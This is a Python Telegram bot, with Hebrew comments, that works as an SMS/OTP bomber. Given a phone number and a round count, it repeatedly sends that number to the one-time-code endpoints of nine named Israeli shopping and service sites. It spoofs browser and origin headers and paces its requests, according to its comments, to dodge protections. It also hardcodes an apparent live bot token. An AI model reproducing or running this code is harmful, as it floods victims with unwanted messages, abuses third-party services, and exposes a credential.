import telebot
import requests
import time
from flask import Flask
from threading import Thread
import os

app = Flask('')
@app.route('/')
def home(): return "Bot is Online"

def keep_alive():
    t = Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080))))
    t.start()

# --- שים כאן את הטוקן שלך ---
API_TOKEN = '8620606926:AAEnv_GDFJSRK3dhSsTVUN5Xu3rwhP72MG8' 
bot = telebot.TeleBot(API_TOKEN)

def attack(m, target, rounds):
    apis = [
        # קבוצת פוקס (הגנה חזקה)
        {"n": "Fox", "u": "https://fox.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": "80b41189-2a28-47cf-9c11-62cda2c7de71"}, "type": "json"},
        {"n": "Laline", "u": "https://www.laline.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": "c8b24899-349b-4838-8303-d279d4e2fffd"}, "type": "json"},
        {"n": "Fox Home", "u": "https://www.foxhome.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": "9c47a6a0-db2f-4be6-a45d-5b8548fd11c2"}, "type": "json"},
        {"n": "Foot Locker", "u": "https://footlocker.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": "8baff678-a092-4f3e-b08d-26adf214696b"}, "type": "json"},
        
        # אתרים יציבים (הגנה רכה)
        {"n": "Hamal", "u": "https://users-auth.hamal.co.il/auth/send-auth-code", "d": {"value": target, "type": "phone", "projectId": "1"}, "type": "json"},
        {"n": "Mishloha", "u": "https://www.mishloha.co.il/api/v1/auth/otp", "d": {"phone": target}, "type": "json"},
        {"n": "GoMobile", "u": "https://api.gomobile.co.il/api/send-otp", "d": {"phone": target}, "type": "json"},
        {"n": "Zygo", "u": "https://api.zygo.co.il/v1/auth/request-otp", "d": {"phone": target}, "type": "json"},
        {"n": "Teva Naot", "u": "https://www.tevanaot.co.il/apps/api/otp/request", "d": {"phone": target}, "type": "json"}
    ]
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
        "Accept": "application/json",
        "Origin": "https://fox.co.il",
        "Referer": "https://fox.co.il/"
    }

    for r in range(int(rounds)):
        success_count = 0
        for site in apis:
            try:
                if site["type"] == "json":
                    res = requests.post(site["u"], json=site["d"], headers=headers, timeout=6)
                else:
                    res = requests.post(site["u"], data=site["d"], headers=headers, timeout=6)
                
                if res.status_code in [200, 201]:
                    success_count += 1
            except: pass
            time.sleep(0.15) # דיליי קצת יותר ארוך כדי לא להקפיץ הגנות
        
        bot.send_message(m.chat.id, f"⚡️ סבב {r+1} הושלם!\n✅ הצלחות: {success_count}/{len(apis)}")
        if r < int(rounds) - 1: time.sleep(1.5)

@bot.message_handler(func=lambda m: True)
def handle(m):
    try:
        parts = m.text.split()
        if len(parts) == 2:
            attack(m, parts[1], parts[0])
    except: pass

if __name__ == "__main__":
    keep_alive()
    bot.remove_webhook()
    bot.polling(none_stop=True)
